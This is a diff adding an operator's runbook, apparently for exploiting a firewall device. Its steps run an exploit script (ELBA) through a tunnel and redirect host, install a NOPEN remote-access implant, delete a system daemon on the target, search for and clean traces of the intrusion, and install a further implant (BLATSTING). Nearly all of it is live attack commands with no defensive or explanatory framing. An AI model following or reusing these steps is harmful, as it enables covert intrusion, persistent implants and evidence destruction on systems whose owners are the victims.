@@ -1,0 +1,65 @@
+mx
+:%s/TGTIP/ACTUALTARGET/g
+:%s/VERSION/VERSION/g
+:%s/RHP/RHP/g
+`x
+
+cp /mnt/zip/FW.zip /current/bin
+cd /current/bin/FW/ELBA
+cp ELBA* /current/bin
+
+####
+##
+## Available versions
+## v3.2.100.010 
+## v3.3.001.050 
+## v3.3.002.021 
+## v3.3.002.030 
+##
+####
+
+# Try to determine version
+-scan telnet TGTIP 
+
+# This needs to be open
+-ping -r TGTIP -t -p 4000
+
+-tunnel
+l 5000 TGTIP 4000 RHP 
+s
+
+#Locally
+#Make sure you run ELBA from /current/bin or bad things will happen (NOPEN won't behave)
+
+./ELBA.sh VERSION -t 127.0.0.1 -p 5000 -r RHP -N -n /current/up/morerats/noserver-3.0.4.1-i686.pc.linux.gnu -y 10000
+
+
+#this should get you up. You cannot get more windows on target.
+#abort the survey
+
+-lt
+-lt /tos/bin/tos_proxyd
+-rm /tos/bin/tos_proxyd
+
+
+#basic systems check
+ps -ef
+-ifconfig
+=df 
+mount
+
+#do a -find on everything and look for recent files.  If ours, investigate and clean
+-find <mount points>
+
+
+# INSTALL BLATSTING
+
+vi /current/bin/FW/BLATSTING_20222/opinstructions/install.txt
+
+-lt 
+-burnBURN
+
+
+
+
+
